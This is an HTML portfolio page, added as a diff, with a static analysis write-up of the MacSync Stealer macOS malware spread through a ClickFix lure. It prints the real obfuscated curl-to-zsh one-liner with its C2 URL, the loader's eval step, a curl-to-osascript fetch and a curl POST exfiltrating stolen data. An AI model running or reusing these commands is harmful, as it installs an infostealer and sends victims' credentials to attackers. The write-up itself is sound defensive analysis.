@@ -1,0 +1,465 @@
+<!DOCTYPE html><!--lQTcBG98iHskLxtrQuFdl--><html lang="en"><head><meta charSet="utf-8"/><meta name="viewport" content="width=device-width, initial-scale=1"/><link rel="stylesheet" href="/_next/static/css/56a4ee9135658199.css" data-precedence="next"/><link rel="preload" as="script" fetchPriority="low" href="/_next/static/chunks/webpack-817f00e841edfe01.js"/><script src="/_next/static/chunks/4bd1b696-bf5e0dbacfa5baef.js" async=""></script><script src="/_next/static/chunks/3794-cb038bf941e0baaf.js" async=""></script><script src="/_next/static/chunks/main-app-1f49d25e340d4632.js" async=""></script><script src="/_next/static/chunks/8500-41fa79ac743d83f1.js" async=""></script><script src="/_next/static/chunks/app/layout-12bcb645dd9aeb80.js" async=""></script><script src="/_next/static/chunks/7746-0cf5c92c775322e1.js" async=""></script><script src="/_next/static/chunks/app/projects/cybersecurity/macsync-stealer/page-93c34dab68825f87.js" async=""></script><title>MacSync Stealer: Static Malware Analysis</title><meta name="description" content="A detailed static analysis of the MacSync Stealer malware, uncovering its multi-stage execution flow and C2 communication methods."/><link rel="author" href="https://kelvincreighton.ca"/><meta name="author" content="Kelvin Creighton"/><meta name="keywords" content="Kelvin Creighton,Cybersecurity,Software Engineering,Computer Science,University of Alberta,Portfolio,CTF,Web Security,Game Development,Automotive Repair"/><meta name="creator" content="Kelvin Creighton"/><meta name="publisher" content="Kelvin Creighton"/><meta name="robots" content="index, follow"/><meta name="googlebot" content="index, follow, max-video-preview:-1, max-image-preview:large, max-snippet:-1"/><meta property="og:title" content="Kelvin Creighton | Portfolio"/><meta property="og:description" content="Personal portfolio and blog of Kelvin Creighton, focusing on Cybersecurity, Software Engineering, and Game Development."/><meta property="og:url" content="https://kelvincreighton.ca/"/><meta property="og:site_name" content="Kelvin Creighton&#x27;s Portfolio"/><meta property="og:locale" content="en_US"/><meta property="og:image:type" content="image/png"/><meta property="og:image:width" content="1200"/><meta property="og:image:height" content="630"/><meta property="og:image" content="https://kelvincreighton.ca/opengraph-image.png?fb8fd3e7788c3bab"/><meta property="og:type" content="website"/><meta name="twitter:card" content="summary_large_image"/><meta name="twitter:title" content="Kelvin Creighton | Portfolio"/><meta name="twitter:description" content="Cybersecurity &amp; Software Engineering Portfolio of Kelvin Creighton."/><meta name="twitter:image:type" content="image/png"/><meta name="twitter:image:width" content="1200"/><meta name="twitter:image:height" content="630"/><meta name="twitter:image" content="https://kelvincreighton.ca/twitter-image.png?fb8fd3e7788c3bab"/><link rel="icon" href="/icon.svg?b1a8d6644834f167" type="image/svg+xml" sizes="any"/><script src="/_next/static/chunks/polyfills-42372ed130431b0a.js" noModule=""></script></head><body class="antialiased"><div hidden=""><!--$--><!--/$--></div><script type="application/ld+json">{"@context":"https://schema.org","@type":"Person","name":"Kelvin Creighton","url":"https://kelvincreighton.ca","sameAs":["https://github.com/KelvinCreighton","https://www.linkedin.com/in/kelvin-creighton-250806263"],"jobTitle":"Computer Science Student","alumniOf":{"@type":"CollegeOrUniversity","name":"University of Alberta"}}</script><script>((a,b,c,d,e,f,g,h)=>{let i=document.documentElement,j=["light","dark"];function k(b){var c;(Array.isArray(a)?a:[a]).forEach(a=>{let c="class"===a,d=c&&f?e.map(a=>f[a]||a):e;c?(i.classList.remove(...d),i.classList.add(f&&f[b]?f[b]:b)):i.setAttribute(a,b)}),c=b,h&&j.includes(c)&&(i.style.colorScheme=c)}if(d)k(d);else try{let a=localStorage.getItem(b)||c,d=g&&"system"===a?window.matchMedia("(prefers-color-scheme: dark)").matches?"dark":"light":a;k(d)}catch(a){}})("class","theme","system",null,["light","dark"],null,true,true)</script><div class="flex flex-col h-[100dvh] overflow-hidden"><nav class="p-3 md:p-3 border-b border-gray-200 dark:border-gray-800 shrink-0 bg-white dark:bg-black z-50"><div class="max-w-7xl mx-auto flex items-center justify-between gap-4"><ul class="flex space-x-4 md:space-x-6 text-sm md:text-base font-medium flex-wrap"><li><a class="transition-all duration-300 hover:text-blue-500 dark:hover:text-blue-300 hover:[text-shadow:0_0_10px_rgba(59,130,246,0.5)] dark:hover:[text-shadow:0_0_10px_rgba(147,197,253,0.6)]" href="/">Home</a></li><li><a class="transition-all duration-300 text-blue-600 dark:text-blue-400 [text-shadow:0_0_12px_rgba(37,99,235,0.6)] dark:[text-shadow:0_0_12px_rgba(96,165,250,0.8)]" href="/projects/">Projects</a></li><li><a class="transition-all duration-300 hover:text-blue-500 dark:hover:text-blue-300 hover:[text-shadow:0_0_10px_rgba(59,130,246,0.5)] dark:hover:[text-shadow:0_0_10px_rgba(147,197,253,0.6)]" href="/resume/">Resume</a></li></ul><div class="p-2 w-9 h-9"></div></div></nav><main class="flex-grow overflow-y-auto"><div class="animate-page-enter min-h-full"><style>
+  :root {
+    --bg:        #0d1e2b;
+    --surface:   #162838;
+    --border:    #2a6080;
+    --accent:    #40f0ff;
+    --accent2:   #ff6680;
+    --accent3:   #70ff50;
+    --text:      #e8f4fb;
+    --muted:     #e8f4fb;
+    --code-bg:   #0a1822;
+    --glow:      0 0 16px #40f0ff88;
+  }
+
+  .page-wrap *, .page-wrap *::before, .page-wrap *::after { box-sizing: border-box; margin: 0; padding: 0; }
+
+  /* Navbar override specifically for writeup pages to make it fit the theme */
+  nav {
+    background: var(--bg) !important;
+    border-color: var(--border) !important;
+    font-family: "Segoe UI", "Helvetica Neue", Helvetica, Arial, sans-serif !important;
+    font-size: 1rem !important;
+  }
+  
+  nav .ThemeToggle, nav button {
+    visibility: hidden !important;
+  }
+
+  footer {
+    background: var(--bg) !important;
+    border-color: var(--border) !important;
+    padding: 0.75rem 0 !important;
+  }
+
+  footer a {
+    display: inline-flex !important;
+    color: var(--muted) !important;
+    transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1) !important;
+  }
+
+  footer a[aria-label="GitHub"]:hover {
+    color: #fff !important;
+    filter: drop-shadow(0 0 8px rgba(255,255,255,0.5));
+  }
+
+  footer a[aria-label="LinkedIn"]:hover {
+    color: #0077b5 !important;
+    filter: drop-shadow(0 0 8px rgba(0,119,181,0.5));
+  }
+
+  footer a[aria-label="Email"]:hover {
+    color: #ea4335 !important;
+    filter: drop-shadow(0 0 8px rgba(234,67,53,0.5));
+  }
+
+  footer a:hover {
+    transform: translateY(-4px);
+  }
+  
+  body {
+    background: var(--bg);
+    color: var(--text);
+    font-family: 'Rajdhani', sans-serif;
+    font-size: 1.2rem;
+    line-height: 1.8;
+    min-height: 100vh;
+    overflow-x: hidden;
+  }
+
+  body::before {
+    content: '';
+    position: fixed; inset: 0;
+    background: repeating-linear-gradient(
+      to bottom,
+      transparent 0px, transparent 3px,
+      rgba(0,0,0,0.08) 3px, rgba(0,0,0,0.08) 4px
+    );
+    pointer-events: none;
+    z-index: 999;
+  }
+
+  body::after {
+    content: '';
+    position: fixed; inset: 0;
+    background-image:
+      linear-gradient(rgba(0,229,255,0.08) 1px, transparent 1px),
+      linear-gradient(90deg, rgba(0,229,255,0.08) 1px, transparent 1px);
+    background-size: 40px 40px;
+    pointer-events: none;
+    z-index: 0;
+  }
+
+  .page-wrap {
+    position: relative;
+    z-index: 1;
+    max-width: 860px;
+    margin: 0 auto;
+    padding: 3rem 1.5rem 6rem;
+  }
+
+  .back-link {
+    display: inline-block;
+    margin-bottom: 2rem;
+    color: var(--muted);
+    text-decoration: none;
+    font-size: 1rem;
+    transition: color 0.2s ease;
+  }
+  .back-link:hover {
+    color: var(--accent);
+    text-decoration: underline;
+  }
+
+  .page-wrap header {
+    border-bottom: 1px solid var(--border);
+    padding-bottom: 2rem;
+    margin-bottom: 3rem;
+    animation: fadeDown 0.6s ease both;
+  }
+
+  .ctf-label {
+    font-family: 'Share Tech Mono', monospace;
+    font-size: 0.95rem;
+    letter-spacing: 0.25em;
+    color: var(--accent);
+    text-transform: uppercase;
+    margin-bottom: 0.5rem;
+  }
+
+  .page-wrap header h1 {
+    font-family: 'Orbitron', monospace;
+    font-size: clamp(2rem, 5vw, 3.4rem);
+    font-weight: 900;
+    color: #fff;
+    text-shadow: var(--glow);
+    line-height: 1.1;
+    margin-bottom: 1.2rem;
+  }
+
+  .meta-grid {
+    display: flex;
+    flex-wrap: wrap;
+    gap: 0.6rem 1.4rem;
+    font-family: 'Share Tech Mono', monospace;
+    font-size: 1rem;
+  }
+
+  .meta-item {
+    display: flex;
+    align-items: center;
+    gap: 0.4rem;
+    color: var(--muted);
+  }
+
+  .meta-item span.val {
+    color: var(--accent);
+  }
+
+  .badge {
+    display: inline-block;
+    padding: 0.15em 0.7em;
+    border-radius: 2px;
+    font-family: 'Share Tech Mono', monospace;
+    font-size: 0.95rem;
+    letter-spacing: 0.08em;
+    border: 1px solid;
+  }
+  .badge.diff-easy   { color: var(--accent3);  border-color: var(--accent3);  background: rgba(57,255,20,0.07); }
+  .badge.diff-medium { color: #ffcc00;          border-color: #ffcc00;         background: rgba(255,204,0,0.07); }
+  .badge.diff-hard   { color: var(--accent2);   border-color: var(--accent2);  background: rgba(255,63,91,0.07); }
+
+  section {
+    margin-bottom: 2.8rem;
+    animation: fadeUp 0.5s ease both;
+  }
+
+  section:nth-child(1) { animation-delay: 0.1s; }
+  section:nth-child(2) { animation-delay: 0.2s; }
+  section:nth-child(3) { animation-delay: 0.3s; }
+  section:nth-child(4) { animation-delay: 0.4s; }
+  section:nth-child(5) { animation-delay: 0.5s; }
+
+  .section-header {
+    display: flex;
+    align-items: center;
+    gap: 0.8rem;
+    margin-bottom: 1.2rem;
+  }
+
+  .section-num {
+    font-family: 'Share Tech Mono', monospace;
+    font-size: 0.9rem;
+    color: var(--accent);
+    letter-spacing: 0.1em;
+    opacity: 0.7;
+  }
+
+  h2 {
+    font-family: 'Orbitron', monospace;
+    font-size: 1.25rem;
+    font-weight: 700;
+    color: var(--accent);
+    text-transform: uppercase;
+    letter-spacing: 0.12em;
+  }
+
+  .section-line {
+    flex: 1;
+    height: 1px;
+    background: linear-gradient(to right, var(--border), transparent);
+  }
+
+  .card {
+    background: var(--surface);
+    border: 1px solid var(--border);
+    border-left: 3px solid var(--accent);
+    padding: 1.2rem 1.4rem;
+    margin-bottom: 1rem;
+    border-radius: 0 4px 4px 0;
+  }
+
+  .card h3 {
+    font-family: 'Orbitron', monospace;
+    font-size: 1.05rem;
+    font-weight: 700;
+    color: #fff;
+    margin-bottom: 0.5rem;
+  }
+
+  .card ul {
+    list-style: none;
+    padding: 0;
+  }
+
+  .card ul li {
+    padding: 0.2rem 0 0.2rem 1.2rem;
+    position: relative;
+    color: var(--text);
+  }
+
+  .card ul li::before {
+    content: '›';
+    position: absolute;
+    left: 0;
+    color: var(--accent);
+  }
+
+  .step {
+    background: var(--surface);
+    border: 1px solid var(--border);
+    border-radius: 4px;
+    margin-bottom: 1.2rem;
+    overflow: hidden;
+    transition: border-color 0.2s;
+  }
+
+  .step:hover { border-color: var(--accent); }
+
+  .step-header {
+    display: flex;
+    align-items: center;
+    gap: 0.8rem;
+    padding: 0.8rem 1.2rem;
+    border-bottom: 1px solid var(--border);
+    background: rgba(0,229,255,0.03);
+  }
+
+  .step-num {
+    font-family: 'Share Tech Mono', monospace;
+    font-size: 0.9rem;
+    color: var(--muted);
+    min-width: 2.5rem;
+  }
+
+  .step-label {
+    font-family: 'Share Tech Mono', monospace;
+    font-size: 1rem;
+    color: #fff;
+    flex: 1;
+  }
+
+  .step-body {
+    padding: 1rem 1.2rem;
+  }
+
+  .io-row {
+    display: grid;
+    grid-template-columns: 60px 1fr;
+    gap: 0.4rem 0.8rem;
+    margin-bottom: 0.8rem;
+    align-items: start;
+  }
+
+  .io-label {
+    font-family: 'Share Tech Mono', monospace;
+    font-size: 0.9rem;
+    letter-spacing: 0.1em;
+    padding-top: 0.1rem;
+  }
+
+  .io-label.in  { color: var(--accent);  }
+  .io-label.out { color: var(--accent3); }
+
+  code {
+    font-family: 'Share Tech Mono', monospace;
+    font-size: 1rem;
+    background: var(--code-bg);
+    border: 1px solid var(--border);
+    padding: 0.5rem 0.8rem;
+    display: block;
+    border-radius: 2px;
+    color: var(--accent);
+    word-break: break-all;
+    white-space: pre-wrap;
+  }
+
+  code.output {
+    color: var(--accent3);
+  }
+
+  code.inline-code {
+    display: inline;
+    padding: 0.2rem 0.4rem;
+    background: var(--code-bg);
+    border: 1px solid var(--border);
+    border-radius: 4px;
+    color: var(--accent);
+    font-size: 0.85em;
+  }
+
+  .reason {
+    font-size: 1.05rem;
+    color: var(--muted);
+    margin-top: 0.6rem;
+    padding-top: 0.6rem;
+    border-top: 1px dashed var(--border);
+  }
+
+  .reason strong {
+    color: var(--text);
+    font-weight: 600;
+  }
+
+  .prose {
+    font-size: 1.1rem;
+    color: var(--text);
+    line-height: 1.9;
+    margin-bottom: 1rem;
+    white-space: pre-wrap;
+  }
+
+  .notice-box {
+    border: 1px solid var(--border);
+    padding: 1.2rem 1.4rem;
+    margin-bottom: 1.2rem;
+    border-radius: 4px;
+    color: var(--text);
+    background: transparent;
+    font-size: 1.0rem;
+    white-space: pre-wrap;
+    font-family: 'Share Tech Mono', monospace;
+  }
+
+  .flag-box {
+    background: var(--code-bg);
+    border: 1px solid var(--accent3);
+    border-radius: 4px;
+    padding: 1.4rem 1.8rem;
+    text-align: center;
+    box-shadow: 0 0 24px rgba(57,255,20,0.12), inset 0 0 30px rgba(57,255,20,0.04);
+  }
+
+  .flag-label {
+    font-family: 'Share Tech Mono', monospace;
+    font-size: 0.7rem;
+    letter-spacing: 0.25em;
+    color: var(--muted);
+    text-transform: uppercase;
+    margin-bottom: 0.6rem;
+  }
+
+  .flag-value {
+    font-family: 'Share Tech Mono', monospace;
+    font-size: 1.05rem;
+    color: var(--accent3);
+    text-shadow: 0 0 10px rgba(57,255,20,0.5);
+    word-break: break-all;
+  }
+
+  .tags {
+    display: flex;
+    flex-wrap: wrap;
+    gap: 0.5rem;
+    margin-top: 0.8rem;
+  }
+
+  .tag {
+    font-family: 'Share Tech Mono', monospace;
+    font-size: 0.9rem;
+    letter-spacing: 0.1em;
+    padding: 0.2em 0.7em;
+    border: 1px solid var(--border);
+    color: var(--muted);
+    border-radius: 2px;
+    background: rgba(255,255,255,0.03);
+  }
+
+  footer {
+    margin-top: 4rem;
+    padding-top: 1.5rem;
+    border-top: 1px solid var(--border);
+    font-family: 'Share Tech Mono', monospace;
+    font-size: 0.9rem;
+    color: var(--muted);
+    display: flex;
+    justify-content: space-between;
+    flex-wrap: wrap;
+    gap: 0.5rem;
+  }
+
+  .pager-wrapper {
+    margin-top: 4rem;
+  }
+
+  .cyber-pager-item {
+    padding: 1rem 1.25rem !important;
+    width: 100% !important;
+  }
+
+  @media (max-width: 768px) {
+    .cyber-pager-item {
+      padding: 1rem 1.25rem !important;
+    }
+  }
+
+  @keyframes fadeDown {
+    from { opacity: 0; transform: translateY(-16px); }
+    to   { opacity: 1; transform: translateY(0); }
+  }
+
+  @keyframes fadeUp {
+    from { opacity: 0; transform: translateY(12px); }
+    to   { opacity: 1; transform: translateY(0); }
+  }
+
+  @media (max-width: 600px) {
+    .io-row { grid-template-columns: 1fr; }
+    .io-label { margin-bottom: 0.2rem; }
+  }
+</style><link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&amp;family=Orbitron:wght@400;700;900&amp;family=Rajdhani:wght@300;400;600&amp;display=swap" rel="stylesheet"/><div class="page-wrap"><a class="back-link" href="/projects/cybersecurity/">← Back to Cybersecurity Projects</a><header><div class="ctf-label">Malware Analysis — Write-Up</div><h1>MacSync Stealer: Static Malware Analysis</h1><div class="meta-grid"><div class="meta-item"><span>Author:</span><span class="val">Kelvin Creighton</span></div></div><div class="tags"><span class="tag">#<!-- -->malware</span><span class="tag">#<!-- -->macos</span><span class="tag">#<!-- -->zsh</span><span class="tag">#<!-- -->static-analysis</span><span class="tag">#<!-- -->applescript</span></div></header><section><div class="section-header"><span class="section-num">01</span><h2>Initial Discovery</h2><div class="section-line"></div></div><p class="prose"><span>In December 2025, a friend encountered a suspicious 'ClickFix' campaign. Intrigued, I decided to take a look. The lure was simple: a popup urging users to download an application by running a 'simple' command in their Terminal. To build trust, the campaign even included an embedded video of someone supposedly running the command on a VM.
+
+The command provided was an obfuscated one-liner designed to bypass mental filters by appearing 'technical' and 'complicated':</span></p><div class="step"><div class="step-header"><span class="step-num">STEP <!-- -->01</span><span class="step-label">The Malicious One-Liner</span></div><div class="step-body"><div class="io-row"><span class="io-label in">INPUT</span><code>curl -kfsSL $(echo &#x27;aHR0cDovL2ZvbGRleG1vb24ud29ybGQvY3VybC9lYzdlNzRkM2E1MDY1NzZmZmFmNTAyMDg3Yjk1YzIzYzEzMWExYWRmMmU1ZDAwYjkwN2UwZDc3ZDIyYjQzN2Ey&#x27;|base64 -D)|zsh</code></div><div class="io-row"><span class="io-label out">OUTPUT</span><code class="output">[Executes Stage 1 Loader]</code></div><p class="reason"><span><strong>Reason:</strong> The command decodes a Base64 string to reveal the hidden C2 URL (</span><code class="inline-code">http://foldexmoon.world/curl/...</code><span>), downloads the payload silently using </span><code class="inline-code">curl</code><span>, and immediately pipes it into </span><code class="inline-code">zsh</code><span> for execution. Obfuscating the URL prevents users from easily checking it in a browser, where security filters might trigger a warning.</span></p></div></div><div class="step"><div class="step-header"><span class="step-num">STEP <!-- -->02</span><span class="step-label">C2 Header Analysis</span></div><div class="step-body"><div class="io-row"><span class="io-label in">INPUT</span><code>curl -I --max-time 5 http://foldexmoon.world/curl/ec7e74d3a506576ffaf502087b95c23c131a1adf2e5d00b907e0d77d22b437a2</code></div><div class="io-row"><span class="io-label out">OUTPUT</span><code class="output">HTTP/1.1 200 OK
+Content-Type: application/octet-stream
+Content-Length: 834
+Server: cloudflare
+Content-Disposition: attachment; filename=&quot;ec7e74d3a506576ffaf502087b95c23c131a1adf2e5d00b907e0d77d22b437a2.daily&quot;</code></div><p class="reason"><span><strong>Reason:</strong> The server delivers an 834-byte binary stream with a </span><code class="inline-code">.daily</code><span> extension. The use of Cloudflare and a non-standard extension is a common obfuscation tactic for Malware-as-a-Service (MaaS) distribution.</span></p></div></div></section><section><div class="section-header"><span class="section-num">02</span><h2>Stage 1: The Zsh Loader</h2><div class="section-line"></div></div><p class="prose"><span>The downloaded file revealed itself to be a Zsh script. Its sole purpose is to decode and execute a second-stage payload entirely in memory, a technique known as 'fileless' execution which helps evade traditional antivirus scans that look for malicious files on disk.</span></p><div class="step"><div class="step-header"><span class="step-num">STEP <!-- -->01</span><span class="step-label">Deobfuscating the Stager</span></div><div class="step-body"><div class="io-row"><span class="io-label in">INPUT</span><code>cat ec7e74d3a506576ffaf502087b95c23c131a1adf2e5d00b907e0d77d22b437a2.daily</code></div><div class="io-row"><span class="io-label out">OUTPUT</span><code class="output">#!/bin/zsh
+d25941=$(base64 -D &lt;&lt;&#x27;PAYLOAD_m14659633818266&#x27; | gunzip
+H4sIAFAeM2kAA+VU0W7TMBR971dcsmrqJJI4cROvHWWbJsHQmIa0ISYBqhz7urXq2FHism7AvxO6...
+PAYLOAD_m14659633818266
+)
+eval &quot;$d25941&quot;</code></div><p class="reason"><span><strong>Reason:</strong> The script uses </span><code class="inline-code">base64 -D</code><span> (a macOS-specific flag) and </span><code class="inline-code">gunzip</code><span> to unpack the hidden payload. The </span><code class="inline-code">eval</code><span> command then executes the result immediately.</span></p></div></div><div class="step"><div class="step-header"><span class="step-num">STEP <!-- -->02</span><span class="step-label">Extracting Stage 2</span></div><div class="step-body"><div class="io-row"><span class="io-label in">INPUT</span><code>echo &quot;[BASE64_DATA]&quot; | base64 -D | gunzip &gt; stage2.sh</code></div><div class="io-row"><span class="io-label out">OUTPUT</span><code class="output">[A 1.3KB Zsh Script]</code></div><p class="reason"><span><strong>Reason:</strong> By manually decoding the payload, we reveal the core logic of the MacSync Stealer before it can execute and hide itself.</span></p></div></div></section><section><div class="section-header"><span class="section-num">03</span><h2>Stage 2: The Stealer Core</h2><div class="section-line"></div></div><p class="prose"><span>The second stage is a sophisticated Zsh-based stealer that acts as a background daemon. It is designed to be persistent, stealthy, and highly dynamic by fetching AppleScript payloads directly from the C2 server.</span></p><div class="step"><div class="step-header"><span class="step-num">STEP <!-- -->01</span><span class="step-label">Stealth Mechanisms</span></div><div class="step-body"><div class="io-row"><span class="io-label in">INPUT</span><code>head -n 10 stage2.sh</code></div><div class="io-row"><span class="io-label out">OUTPUT</span><code class="output">daemon_function() {
+    exec &lt;/dev/null
+    exec &gt;/dev/null
+    exec 2&gt;/dev/null
+    local domain=&quot;foldexmoon.world&quot;</code></div><p class="reason"><span><strong>Reason:</strong> The script redirects all standard streams to </span><code class="inline-code">/dev/null</code><span>, ensuring no output is visible in the user's Terminal. It then defines its Command & Control (C2) infrastructure.</span></p></div></div><div class="step"><div class="step-header"><span class="step-num">STEP <!-- -->02</span><span class="step-label">Dynamic AppleScript Execution</span></div><div class="step-body"><div class="io-row"><span class="io-label in">INPUT</span><code>grep &#x27;osascript&#x27; stage2.sh</code></div><div class="io-row"><span class="io-label out">OUTPUT</span><code class="output">curl -k -s ... &quot;http://$domain/dynamic?txd=$token&quot; | osascript</code></div><p class="reason"><span><strong>Reason:</strong> This is a critical discovery. The malware downloads dynamic AppleScript code and pipes it into </span><code class="inline-code">osascript</code><span>. This allows the attacker to push new stealing logic (Keychain access, browser data harvesting, etc.) without updating the main script.</span></p></div></div><div class="step"><div class="step-header"><span class="step-num">STEP <!-- -->03</span><span class="step-label">Data Exfiltration (The &#x27;Gate&#x27;)</span></div><div class="step-body"><div class="io-row"><span class="io-label in">INPUT</span><code>grep &#x27;POST&#x27; stage2.sh</code></div><div class="io-row"><span class="io-label out">OUTPUT</span><code class="output">curl -k -X POST ... -F &quot;file=@/tmp/osalogging.zip&quot; ... &quot;http://$domain/gate&quot;</code></div><p class="reason"><span><strong>Reason:</strong> The malware bundles stolen data into </span><code class="inline-code">/tmp/osalogging.zip</code><span> and uploads it to the </span><code class="inline-code">/gate</code><span> endpoint. Research confirms that </span><code class="inline-code">osalogging.zip</code><span> is a known Indicator of Compromise (IoC) for the MacSync family.</span></p></div></div></section><section><div class="section-header"><span class="section-num">04</span><h2>Context &amp; Research</h2><div class="section-line"></div></div><p class="prose"><span>After my initial analysis in December 2025, further research confirmed this was MacSync Stealer (also known as Mac.c), a Malware-as-a-Service (MaaS) created by the threat actor 'Mentalpositive'.</span></p><div class="card"><h3>Evolution of MacSync</h3><ul><li><span><strong>Origins:</strong> Emerged in April 2025 as a cheap, accessible infostealer for entry-level cybercriminals.</span></li><li><span><strong>Social Engineering:</strong> Leverages the complexity of Terminal commands to bypass user suspicion. The use of </span><code class="inline-code">base64</code><span> encoding prevents link discovery through browser-based security filters.</span></li><li><span><strong>Trust Building:</strong> Employs social proof, such as embedded videos of VMs supposedly running the command safely, to manipulate users into taking high-risk actions.</span></li><li><span><strong>Distribution:</strong> Evolved from 'ClickFix' Terminal commands to highly sophisticated, Apple-notarized Swift applications to bypass Gatekeeper.</span></li><li><span><strong>Infrastructure:</strong> Extensive use of the </span><code class="inline-code">.world</code><span> and </span><code class="inline-code">.shop</code><span> TLDs (e.g., </span><code class="inline-code">foldexmoon.world</code><span>) for C2 operations.</span></li></ul></div></section><section><div class="section-header"><span class="section-num">05</span><h2>Key Takeaways</h2><div class="section-line"></div></div><div class="card"><h3>Security Recommendations</h3><ul><li><span>Never copy and paste commands from untrusted websites into your Terminal, even if they appear to be from 'trusted' sources like GitHub or ChatGPT.</span></li><li><span>The use of </span><code class="inline-code">curl | sh</code><span> or </span><code class="inline-code">curl | osascript</code><span> is a high-risk pattern that should be treated with extreme suspicion.</span></li><li><span>Regularly audit your </span><code class="inline-code">/tmp</code><span> directory and background processes for unusual activity, particularly those redirecting all output to </span><code class="inline-code">/dev/null</code><span>.</span></li></ul></div></section><footer><span>Kelvin Creighton<!-- --> — <!-- -->Malware Analysis — Write-Up</span><span>All steps performed in a legal environment.</span></footer><div class="pager-wrapper"><nav aria-label="Project navigation" class="mt-12 grid w-full max-w-4xl grid-cols-1 gap-6 md:grid-cols-2"><a class="cyber-pager-item group flex flex-col justify-center rounded-2xl border border-[#2a6080] bg-[#162838] transition-all hover:bg-[#1e344a] hover:border-[#40f0ff] w-full" href="/projects/cybersecurity/cupid-portal/"><p class="text-[11px] font-bold uppercase tracking-[0.25em] text-[#40f0ff]">← Next Project</p><p class="mt-2 text-lg font-black text-white leading-tight transition-colors group-hover:text-[#40f0ff]">HTCOTB2026 CTF: Cupid&#x27;s Secret Message</p></a><a class="cyber-pager-item group flex flex-col justify-center rounded-2xl border border-[#2a6080] bg-[#162838] transition-all hover:bg-[#1e344a] hover:border-[#40f0ff] w-full text-right" href="/projects/cybersecurity/soap/"><p class="text-[11px] font-bold uppercase tracking-[0.25em] text-[#40f0ff]">Previous Project →</p><p class="mt-2 text-lg font-black text-white leading-tight transition-colors group-hover:text-[#40f0ff]">PicoCTF: SOAP</p></a></nav></div></div><!--$--><!--/$--></div></main><footer class="w-full border-t border-gray-200 dark:border-gray-800 py-3 shrink-0 bg-white dark:bg-black z-50"><div class="max-w-7xl mx-auto flex flex-col items-center justify-center gap-4"><div class="flex items-center gap-6"><a href="https://github.com/KelvinCreighton/" target="_blank" rel="noopener noreferrer" class="text-gray-600 hover:text-black dark:text-gray-400 dark:hover:text-white transition-colors" aria-label="GitHub"><svg stroke="currentColor" fill="none" stroke-width="2" viewBox="0 0 24 24" stroke-linecap="round" stroke-linejoin="round" height="24" width="24" xmlns="http://www.w3.org/2000/svg"><path d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37 0 0 0-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44 0 0 0 20 4.77 5.07 5.07 0 0 0 19.91 1S18.73.65 16 2.48a13.38 13.38 0 0 0-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07 0 0 0 5 4.77a5.44 5.44 0 0 0-1.5 3.78c0 5.42 3.3 6.61 6.44 7A3.37 3.37 0 0 0 9 18.13V22"></path></svg></a><a href="https://www.linkedin.com/in/kelvin-creighton-250806263" target="_blank" rel="noopener noreferrer" class="text-gray-600 hover:text-blue-600 dark:text-gray-400 dark:hover:text-blue-400 transition-colors" aria-label="LinkedIn"><svg stroke="currentColor" fill="none" stroke-width="2" viewBox="0 0 24 24" stroke-linecap="round" stroke-linejoin="round" height="24" width="24" xmlns="http://www.w3.org/2000/svg"><path d="M16 8a6 6 0 0 1 6 6v7h-4v-7a2 2 0 0 0-2-2 2 2 0 0 0-2 2v7h-4v-7a6 6 0 0 1 6-6z"></path><rect x="2" y="9" width="4" height="12"></rect><circle cx="4" cy="4" r="2"></circle></svg></a><a href="mailto:kcreight@ualberta.ca" class="text-gray-600 hover:text-red-600 dark:text-gray-400 dark:hover:text-red-400 transition-colors" aria-label="Email"><svg stroke="currentColor" fill="none" stroke-width="2" viewBox="0 0 24 24" stroke-linecap="round" stroke-linejoin="round" height="24" width="24" xmlns="http://www.w3.org/2000/svg"><path d="M4 4h16c1.1 0 2 .9 2 2v12c0 1.1-.9 2-2 2H4c-1.1 0-2-.9-2-2V6c0-1.1.9-2 2-2z"></path><polyline points="22,6 12,13 2,6"></polyline></svg></a></div></div></footer></div><script src="/_next/static/chunks/webpack-817f00e841edfe01.js" id="_R_" async=""></script><script>(self.__next_f=self.__next_f||[]).push([0])</script><script>self.__next_f.push([1,"1:\"$Sreact.fragment\"\n2:I[2737,[\"8500\",\"static/chunks/8500-41fa79ac743d83f1.js\",\"7177\",\"static/chunks/app/layout-12bcb645dd9aeb80.js\"],\"ThemeProvider\"]\n3:I[5924,[\"8500\",\"static/chunks/8500-41fa79ac743d83f1.js\",\"7177\",\"static/chunks/app/layout-12bcb645dd9aeb80.js\"],\"NavBar\"]\n4:I[7627,[\"8500\",\"static/chunks/8500-41fa79ac743d83f1.js\",\"7177\",\"static/chunks/app/layout-12bcb645dd9aeb80.js\"],\"ThemeToggle\"]\n5:I[3770,[\"8500\",\"static/chunks/8500-41fa79ac743d83f1.js\",\"7177\",\"static/chunks/app/layout-12bcb645dd9aeb80.js\"],\"PageTransition\"]\n6:I[7121,[],\"\"]\n7:I[4581,[],\"\"]\nf:I[7123,[],\"\"]\n:HL[\"/_next/static/css/56a4ee9135658199.css\",\"style\"]\n"])</script><script>self.__next_f.push([1,"0:{\"P\":null,\"b\":\"lQTcBG98iHskLxtrQuFdl\",\"c\":[\"\",\"projects\",\"cybersecurity\",\"macsync-stealer\",\"\"],\"q\":\"\",\"i\":false,\"f\":[[[\"\",{\"children\":[\"projects\",{\"children\":[\"cybersecurity\",{\"children\":[\"macsync-stealer\",{\"children\":[\"__PAGE__\",{}]}]}]}]},\"$undefined\",\"$undefined\",true],[[\"$\",\"$1\",\"c\",{\"children\":[[[\"$\",\"link\",\"0\",{\"rel\":\"stylesheet\",\"href\":\"/_next/static/css/56a4ee9135658199.css\",\"precedence\":\"next\",\"crossOrigin\":\"$undefined\",\"nonce\":\"$undefined\"}]],[\"$\",\"html\",null,{\"lang\":\"en\",\"suppressHydrationWarning\":true,\"children\":[\"$\",\"body\",null,{\"className\":\"antialiased\",\"children\":[[\"$\",\"script\",null,{\"type\":\"application/ld+json\",\"dangerouslySetInnerHTML\":{\"__html\":\"{\\\"@context\\\":\\\"https://schema.org\\\",\\\"@type\\\":\\\"Person\\\",\\\"name\\\":\\\"Kelvin Creighton\\\",\\\"url\\\":\\\"https://kelvincreighton.ca\\\",\\\"sameAs\\\":[\\\"https://github.com/KelvinCreighton\\\",\\\"https://www.linkedin.com/in/kelvin-creighton-250806263\\\"],\\\"jobTitle\\\":\\\"Computer Science Student\\\",\\\"alumniOf\\\":{\\\"@type\\\":\\\"CollegeOrUniversity\\\",\\\"name\\\":\\\"University of 